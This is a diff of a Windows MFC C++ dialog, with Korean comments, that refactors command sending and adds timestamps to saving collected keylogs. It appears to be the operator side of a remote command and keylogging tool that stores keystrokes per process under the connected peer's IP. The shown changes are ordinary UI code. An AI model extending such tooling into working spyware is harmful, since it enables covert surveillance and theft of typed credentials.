@@ -130,6 +130,35 @@ void CClient::OnClose()
 void CClient::OnBnClickedButtonSend()
 {
 	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
+	SendCommand();
+	// 후 입력된 커맨드 초기화
+	m_command = TEXT(""); 
+	UpdateData(FALSE);
+}
+
+
+BOOL CClient::PreTranslateMessage(MSG* pMsg)
+{
+	// TODO: 여기에 특수화된 코드를 추가 및/또는 기본 클래스를 호출합니다.
+
+	// 커맨드 입력창에 쉬프트를 안누른 상태로 엔터가 입력되었을 경우
+	if (pMsg->message == WM_KEYDOWN &&
+		pMsg->hwnd == GetDlgItem(IDC_EDIT_COMMAND)->m_hWnd &&
+		pMsg->wParam == VK_RETURN &&
+		GetKeyState(VK_SHIFT) >= 0)
+		{
+			SendCommand(); // 커맨드 전송
+			// 후 입력된 커맨드 초기화
+			m_command = TEXT(""); 
+			UpdateData(FALSE);
+		}
+
+	return CDialogEx::PreTranslateMessage(pMsg);
+}
+
+void CClient::SendCommand()
+{
+	// TODO: 여기에 구현 코드 추가.
 
 	CheckEditsEmpty();
 	UpdateData(TRUE);
@@ -357,7 +386,6 @@ void CClient::OnClickedRadioMsgKind(UINT uid)
 		GetDlgItem(IDC_SPIN_COMMAND_DELAY)->EnableWindow(FALSE);
 		GetDlgItem(IDC_EDIT_COMMAND)->SetFont(GetFont()); // 메시지 입력창을 mfc 기본 폰트로 설정
 		break;
-
 	default: // 아니면
 		GetDlgItem(IDC_STATIC_FONT)->EnableWindow(TRUE);
 		GetDlgItem(IDC_COMBO_FONT)->EnableWindow(TRUE);
@@ -414,18 +442,19 @@ void CClient::CheckEditsEmpty()
 			str.Format(TEXT("%d"), resource_value[i]);
 			GetDlgItem(resource_id[i])->SetWindowTextW(str);
 		}
+
 	}
 }
 
 void CClient::OnBnClickedButtonSaveKeylogs()
 {
 	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
-	MessageBox(_T("저장되었습니다"), _T("확인"), MB_OK);
-	SaveKeylogs();
+	SaveKeylogs(CTime::GetCurrentTime().GetTime());
+	MessageBox(_T("저장되었습니다"), _T("확인"), MB_OK | MB_ICONINFORMATION);
 }
 
 /* 모든 프로세스의 키로그 모두 저장 */
-void CClient::SaveKeylogs()
+void CClient::SaveKeylogs(__time64_t timestamp)
 {
 	// TODO: 여기에 구현 코드 추가.
 	CString IP;
@@ -433,5 +462,5 @@ void CClient::SaveKeylogs()
 	socket->GetPeerName(IP, port);
 
 	for (int i = 0; i < m_keylogs.size(); i++)
-		m_keylogs[i]->SaveKeylog(IP, no);
+		m_keylogs[i]->SaveKeylog(IP, no, timestamp);
 }
